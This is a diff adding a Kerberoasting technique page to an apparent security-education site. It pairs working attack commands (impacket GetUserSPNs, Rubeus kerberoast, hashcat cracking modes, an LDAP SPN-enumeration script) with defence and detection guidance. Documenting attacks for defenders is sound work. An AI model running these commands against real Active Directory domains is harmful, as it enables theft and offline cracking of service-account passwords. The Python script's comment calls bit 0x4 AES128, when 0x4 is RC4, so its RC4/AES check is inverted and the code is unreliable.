@@ -1,0 +1,184 @@
+---
+title: Kerberoasting
+mitre: T1558.003
+category: credential-access
+group: Kerberos Attacks
+summary: Request TGS tickets for service accounts and crack the RC4 or AES service key offline.
+platform: [Windows]
+tags: ['Python', 'PowerShell', 'Kerberos', 'Active Directory']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: enumerate SPNs (LDAP query)
+    desc: Find all service principal names in the domain — these identify accounts with Kerberos service tickets.
+    dll: —
+  - call: KerberosRequestorSecurityToken / GetTGSTicket
+    desc: Request a TGS ticket for each SPN — the KDC encrypts the ticket with the service account's hash.
+    dll: secur32
+  - call: export ticket from memory
+    desc: Pull the raw ticket bytes from the Kerberos credential cache using LSASS APIs or Mimikatz.
+    dll: secur32
+  - call: crack offline
+    desc: Feed the ticket blob to hashcat or john; RC4 encryption (etype 23) is orders of magnitude faster to crack than AES.
+    dll: —
+detections:
+  - src: WINDOWS EID 4769
+    text: Kerberos service ticket request with encryption type 0x17 (RC4-HMAC) for an account that normally uses AES.
+  - src: BEHAVIOURAL
+    text: A single account requesting TGS tickets for dozens of different SPNs in a short window.
+  - src: THREAT INTEL
+    text: hashcat / impacket / Rubeus tool signatures on disk or in command-line arguments.
+  - src: HONEY TOKEN
+    text: A fake service account SPN that no legitimate process should ever request a ticket for — any request is an alert.
+related:
+  - mitre: T1558.001
+    title: Golden Ticket
+    desc: Full domain compromise — forge TGTs with the krbtgt hash.
+  - mitre: T1003.001
+    title: LSASS Memory Dump
+    desc: Alternative credential source; both target domain account material.
+    href: /techniques/credential-access/lsass-memory-dump
+  - mitre: T1550.003
+    title: Pass-the-Ticket
+    desc: Use stolen or forged tickets without cracking — requires the ticket itself, not the hash.
+labKit:
+  - label: GetUserSPNs.py (impacket)
+    href: 'https://github.com/fortra/impacket'
+  - label: Rubeus (C#, Kerberoast module)
+    href: 'https://github.com/GhostPack/Rubeus'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Any authenticated domain user can request a Kerberos service ticket (TGS) for any registered
+service principal name (SPN). The KDC encrypts part of the ticket with the service account's
+password hash. An attacker requests tickets for every service account SPN, exports the encrypted
+blobs, and cracks them offline — never touching LSASS, never opening a privileged handle.
+
+The attack requires only a valid domain account (which any employee has) and network access to
+the KDC on port 88. The cracking is entirely offline. This makes Kerberoasting one of the most
+passive credential-access techniques available — it produces minimal network noise and requires
+no elevated privileges to execute.
+
+<Callout type="caution">
+  RC4-encrypted tickets (`etype 0x17`) crack in seconds on a GPU for short passwords. Enforcing
+  AES-only Kerberos encryption (`msDS-SupportedEncryptionTypes = 0x18`) across all service
+  accounts eliminates this shortcut, though AES tickets are still crackable if the password is
+  weak.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Python (impacket — remote, no domain join required)
+
+<CodeBlock
+  file="kerberoast.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Enumerate SPNs and request tickets — works from Linux
+$ python3 GetUserSPNs.py corp.local/jsmith:Password1 -outputfile hashes.txt
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+ServicePrincipalName              Name       MemberOf  PasswordLastSet
+--------------------------------  ---------  --------  -------------------
+MSSQLSvc/sql01.corp.local:1433    svc_sql    -         2024-01-15 09:12:33
+HTTP/intranet.corp.local          svc_web    -         2023-11-02 14:45:00
+SPNs found: 2
+
+$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a3c8...
+$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/intranet.corp.local*$f9d2...`}
+/>
+
+### PowerShell (Rubeus — on-host)
+
+<CodeBlock
+  file="kerberoast.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Rubeus: request tickets for all SPNs, output in hashcat format
+.\\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
+
+# Target only accounts with RC4 enabled for faster cracking
+.\\Rubeus.exe kerberoast /rc4opsec /outfile:hashes_rc4.txt
+
+# Target a single high-value account
+.\\Rubeus.exe kerberoast /user:svc_sql /format:hashcat`}
+/>
+
+### Cracking with hashcat
+
+<CodeBlock
+  file="crack.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# RC4 ticket (etype 23) — mode 13100
+$ hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt \
+          -r /usr/share/hashcat/rules/best64.rule
+
+# AES256 ticket (etype 18) — mode 19700 (slower)
+$ hashcat -m 19700 hashes_aes.txt /usr/share/wordlists/rockyou.txt`}
+/>
+
+## SPN enumeration via LDAP
+
+<CodeBlock
+  file="enum_spns.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`from ldap3 import Server, Connection, SUBTREE, ALL_ATTRIBUTES
+
+def enum_spns(dc_ip, domain, username, password):
+    s = Server(dc_ip, get_info='ALL')
+    c = Connection(s, f"{domain}\\\\{username}", password, auto_bind=True)
+    
+    base_dn = ','.join(f'DC={part}' for part in domain.split('.'))
+    c.search(base_dn,
+             '(&(objectClass=user)(servicePrincipalName=*))',
+             SUBTREE,
+             attributes=['sAMAccountName','servicePrincipalName',
+                         'pwdLastSet','msDS-SupportedEncryptionTypes'])
+    for entry in c.entries:
+        enc_types = int(getattr(entry, 'msDS-SupportedEncryptionTypes', 0) or 0)
+        rc4_allowed = not (enc_types & 0x4)   # 0x4 = AES128; if absent, RC4 is default
+        print(f"[{'RC4' if rc4_allowed else 'AES'}] {entry.sAMAccountName}")
+        for spn in entry.servicePrincipalName:
+            print(f"  SPN: {spn}")`}
+/>
+
+## Defence
+
+| Control | Effect |
+|---|---|
+| Strong service account passwords (25+ random chars) | Cracking infeasible even with GPU |
+| AES-only Kerberos (`msDS-SupportedEncryptionTypes = 0x18`) | No RC4 tickets; AES still crackable but much slower |
+| Group Managed Service Accounts (gMSA) | 120-char auto-rotating password; practically uncrackable |
+| Honey SPN accounts | Zero-FP alert on any ticket request |
+| EID 4769 alerting on etype 0x17 requests | Real-time detection |
+
+gMSA is the permanent fix. Converting service accounts to gMSA eliminates the human-chosen
+password that makes kerberoasting viable.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
